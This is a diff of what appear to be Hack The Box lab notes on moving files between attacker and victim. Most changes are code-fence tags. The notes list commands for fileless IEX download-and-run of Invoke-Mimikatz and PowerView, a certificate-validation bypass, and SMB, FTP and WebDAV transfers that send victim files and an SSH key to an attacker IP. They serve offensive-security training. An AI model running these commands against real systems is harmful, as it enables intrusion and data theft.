@@ -1,15 +1,15 @@
 ## Downloads
 #### Encoding - from linux to win
-```shell-session
+```shell
 u@htb[/htb]$ cat id_rsa |base64 -w 0 > hash
 ```
 
-```powershell-session
+```powershell
 PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("hash"))
 ```
 
 ##### Encoding - from win to lin
-```powershell-session
+```powershell
 PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 
 <hash>
@@ -20,7 +20,7 @@ Hash
 3688374325B992DEF12793500307566D
 ```
 
-```shell-session
+```shell
 jabrach@htb[/htb]$ echo hash= | base64 -d > hosts
 ```
 
@@ -36,7 +36,7 @@ jabrach@htb[/htb]$ echo hash= | base64 -d > hosts
 |[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
 |[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)||
 #### DownloadFile
-```powershell-session
+```powershell
 PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
 
 PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
@@ -48,17 +48,17 @@ Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMa
 ```
 
 ##### Fileless method
-```powershell-session
+```powershell
 PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 ```
 
-```powershell-session
+```powershell
 PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
 ```
 
 ##### Invoke-WebRequest
 
-```powershell-session
+```powershell
 PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
 ```
 
@@ -67,7 +67,7 @@ PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P
 
 ##### Internet Explorer first-launc
 
-```powershell-session
+```powershell
 PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
 
 Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
@@ -82,7 +82,7 @@ PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 
 ##### Certifcate not trusted
 
-```powershell-session
+```powershell
 PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 
 Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
@@ -97,38 +97,38 @@ PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback
 
 #### SMB
 
-```shell-session
+```shell
 jabrach@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
 ```
 
-```cmd-session
+```cmd
 C:\htb> copy \\192.168.220.133\share\nc.exe
 ```
 
 #### SMB with auth
 
-```shell-session
+```shell
 jabrach@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 ```
 
-```cmd-session
+```cmd
 C:\htb> net use n: \\192.168.220.133\share /user:test test
 ```
 
 #### FTP
 
-```shell-session
+```shell
 jabrach@htb[/htb]$ sudo pip3 install pyftpdlib
 
 jabrach@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
 ```
 
-```powershell-session
+```powershell
 PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
 ```
 
 or create command file:
-```cmd-session
+```cmd
 C:\htb> echo open 192.168.49.128 > ftpcommand.txt
 C:\htb> echo USER anonymous >> ftpcommand.txt
 C:\htb> echo binary >> ftpcommand.txt
@@ -148,10 +148,9 @@ This is a test file
 
 ## Uploads
 #### Upload via server
-```shell-session
+```shell
 jabrach@htb[/htb]$ pip3 install uploadserver
-```
-```shell-session
+
 jabrach@htb[/htb]$ python3 -m uploadserver
 
 File upload available at /upload
@@ -159,7 +158,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 ```
 
-```powershell-session
+```powershell
 PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 
@@ -168,42 +167,42 @@ PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Win
 ```
 
 ##### Upload via base64
-```powershell-session
+```powershell
 PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 ```
 then catch with nc:
-```shell-session
+```shell
 jabrach@htb[/htb]$ nc -lvnp 8000
 ```
 
 #### SMB
-```shell-session
+```shell
 jabrach@htb[/htb]$ sudo pip3 install wsgidav cheroot
 
 jabrach@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
 ```
 
-```cmd-session
+```cmd
 C:\htb> dir \\192.168.49.128\DavWWWRoot
 ```
 
-```cmd-session
+```cmd
 C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 ```
 
 #### FTP
 
-```shell-session
+```shell
 jabrach@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
 ```
 
-```powershell-session
+```powershell
 PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 
-```cmd-session
+```cmd
 C:\htb> echo open 192.168.49.128 > ftpcommand.txt
 C:\htb> echo USER anonymous >> ftpcommand.txt
 C:\htb> echo binary >> ftpcommand.txt
